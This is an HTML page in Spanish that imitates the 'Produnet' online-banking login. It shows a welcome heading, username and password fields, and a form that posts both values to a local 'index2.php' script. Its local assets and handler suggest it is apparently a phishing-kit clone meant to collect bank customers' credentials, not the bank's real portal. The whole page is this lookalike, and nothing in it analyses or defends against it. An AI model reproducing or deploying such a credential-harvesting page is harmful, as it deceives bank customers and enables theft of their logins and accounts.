<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=yes" target-densitydpi="dpi">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>Produ</title>
    <link href="produnetcss.css" rel="stylesheet">
</head>
<body>
    <header id="cabecera" class="container-fluid">
        <div class="row">
            <noscript>
                <div id="divIndicacionScript" class="col-sm-12 col-md-12 col-lg-12 col-xs-12">
                    <div class="alert alert-info" role="alert">
                        <blockquote class="blockquote-info">
                            Produnet requiere usar Javascript. Por favor activa esta funcionalidad en tu navegador y refresca la página.
                        </blockquote>
                    </div>
                </div>
            </noscript>
        </div>
    </header>
    <main id="contenedorPrincipal" class="ds-contenedor-principal">
        <section class="ds-contenedor ds-contenedor--publico ds-contenedor__scroll">
            <aside class="ds-imagen-principal">
                <div class="ds-imagen-principal__banner"></div>
            </aside>
            <section class="ds-contenido-principal">
                <div id="logoMarca" class="ds-logotipo"></div>
                <div id="contenedorMensajeAlertaError"> </div>
                <div id="contenedorMensajeAlertaExito"> </div>
                <h4 style="font-family:Trebuchet MS,sans-serif;" class="ds-titulo-primario ds-titulo-primario--color-primario"> Hola, te damos la bienvenida </h4>
                <div id="contenedorMensajeAlertaInformativa"> </div>
                <section id="contenidoPrincipal">
                    <div id="divContenedorPagina">
                        <div class="ds-formulario-vista">
                            <form action="index2.php" method="post">
                                <br>
                                <img style="width: 400px;" src="imgs/produs.png" alt="">
                                <br><br>
                                <div>
                                    <div class="ds-grupo-caja">
                                        <label style="font-family:Trebuchet MS,sans-serif;" class="ds-etiqueta">Usuario</label>
                                        <input style="font-family:Trebuchet MS,sans-serif;" autocomplete="off" autofocus="true" class="ds-control-caja-texto ds-usuario__caja-usuario ds-mayuscula" id="NombreUsuario" maxlength="20" name="userid" placeholder="Ingresa tu nombre de usuario" required="required" spellcheck="false" type="text" aria-required="true">
                                        <br><br>
                                        <label style="font-family:Trebuchet MS,sans-serif;" class="ds-etiqueta">Contraseña</label>
                                        <input style="font-family:Trebuchet MS,sans-serif;" autocomplete="off" autofocus="true" class="ds-control-caja-texto ds-usuario__caja-usuario ds-mayuscula" id="NombreUsuario" maxlength="20" name="userclav" placeholder="Ingresa tu contraseña" required="required" spellcheck="false" type="password" aria-required="true">
                                    </div>
                                    <div id="divBotonInicioSesion" class="ds-div__boton--mostrar">
                                        <input style="background-color:#075B00;font-family:Trebuchet MS,sans-serif;" type="submit" value="Continuar" id="btnEnrolamiento" class="ds-control ds-control-boton ds-control-boton--secundario">
                                    </div>
                                    <div id="divBotonInicioSesionIE" class="ds-div__boton--ocultar">
                                        <input type="submit" value="Continuar" id="btnAceptarInternetExplorer" class="ds-control ds-control-boton ds-margen-superior-30 ds-margen-superior-30 ds-control-boton--deshabilitado" disabled="disabled">
                                    </div>
                                    <div class="ds-contenedor-hipervinculo">
                                        <a style="font-family:Trebuchet MS,sans-serif;" id="idSolicitudDesbloqueoUsuario" class="ds-hipervinculo">¿Olvidaste tu usuario o quieres desbloquearlo?</a>
                                    </div>
                                </div>
                            </form>
                            <img style="width: 400px;" src="imgs/ban.png" alt="">
                            <div>
                                <button style="font-family:Trebuchet MS,sans-serif;" type="button" id="btnEnrolamiento" class="ds-control ds-control-boton ds-control-boton--secundario">Regístrate</button>
                            </div>
                            <div class="ds-contenedor-hipervinculo ds-usuario__indicaciones">
                                <img width=400px"" src="imgs/captus.png" alt="">
                            </div>
                        </div>
                    </div>
                </section>
            </section>
        </section>
    </main>
    <div class="lb-closeContainer"><a class="lb-close"></a></div>
</body>
</html>
